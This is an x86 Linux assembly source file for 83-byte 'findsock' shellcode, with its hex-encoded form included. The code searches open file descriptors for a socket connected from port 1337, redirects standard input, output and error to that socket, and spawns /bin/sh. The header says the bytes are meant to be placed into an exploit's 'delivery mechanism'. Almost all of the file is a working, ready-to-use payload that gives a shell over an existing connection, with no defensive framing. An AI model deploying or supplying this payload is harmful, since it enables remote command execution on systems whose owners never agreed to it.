; Leander Metcalf
; 30 November 2014
;
; nasm -f bin findsock-shellcode.asm
; 83 Bytes with no 0x00 or 0x0a bytes
;
; After building the binary, harvest the hex code to place
; into the delivery mechanism.

/*
$port="\x05\x39";	#port 0x0539 = 1337 in decimal
my $sc =
"\x31\xdb\xf7\xe3\x53\x89\xe2\x6a\x10\x54\x52\x53\x89\xe1\xb3" . 
"\x07\xb0\x66\xcd\x80\x31\xdb\x66\x39\xd8\x75\x0c\x66\xbb" . 
"$port" .
"\x8b\x7a\x02\x66\x39\xfb\x74\x07\x31\xc0\x5b\x43\x53\xeb" . 
"\xe0\x5b\x31\xc9\xb1\x03\xb0\x3f\x66\x49\xcd\x80\x66\x41\xe2" . 
"\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50" . 
"\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
# Shellcode Length: 83
# cport = 1337
*/

BITS 32
SECTION .text 	; Section containing code
global _start 			 ; Entry Point

_start:
	xor	 ebx, ebx
	mul      ebx
	push	 ebx
	mov	 edx, esp
	push	 byte +0x10
	push	 esp              ; len
	push	 edx               ;*sockaddr ptr
	push	 ebx              ;sockfd
	mov	 ecx, esp
findSock:
	mov	 bl, 0x7
	mov      al, 0x66
	int	 0x80
	xor	 ebx, ebx
  	cmp      ax, bx
  	jne      next_sockfd
check_sock_addr:
  	mov      bx, 0x3905
	mov	 edi, [edx + 2]
  	cmp      bx, di
  	je       exitLoop
next_sockfd:
	xor	 eax, eax
  	pop      ebx
  	inc      ebx
  	push     ebx
  	jmp      findSock
exitLoop:
	pop      ebx
	xor	 ecx, ecx
	mov	 cl, 0x3
dup_loop:
  	mov	 al, 0x3f
  	dec	 cx
  	int	 0x80
  	inc	 cx
  	loop	 dup_loop
execve:
	push	 eax
	push	 dword 0x68732f2f
	push	 dword 0x6e69622f
	mov	 ebx, esp
	push	 eax
	push	 ebx
	mov	 ecx, esp
	cdq
	mov	 al, 0xb
	int	 0x80
